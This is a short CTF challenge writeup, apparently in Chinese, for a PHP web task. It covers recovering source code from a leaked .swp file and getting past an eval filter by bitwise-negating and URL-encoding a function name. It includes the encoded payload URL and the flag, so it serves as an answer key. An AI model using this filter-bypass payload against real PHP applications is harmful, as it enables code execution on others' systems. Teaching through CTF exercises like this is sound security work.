- **题目名称：** simple_php
- **题目类型：** WEB
- **题目难度：** 中等
- **出题人：** tutu
- **考点：** 

1.  源码泄露swp
2.  特殊字符webshell构造

- **描述：**  你这shell保熟吗？

- **flag：** flag{a3b5c6d-563ae31f-b6672e33ed-ff63a5b8}

- **Writeup：** 

  根据提示，访问index.php.swp得到源码，进行审计发现大部分webshell构造方式都被ban，因为eval()可以利用`('getflag')();`的方式来执行函数，所以可以将字符串取反后装成十六进制，添加上%构造 URL 编码的特殊字符串，再通过取反构造webshell：

  ```php
  <?php
  echo bin2hex(~'getflag'); //989a8b99939e98-->%98%9a%8b%99%93%9e%98
  //payload: index.php?code=(~%98%9a%8b%99%93%9e%98)();
  ```
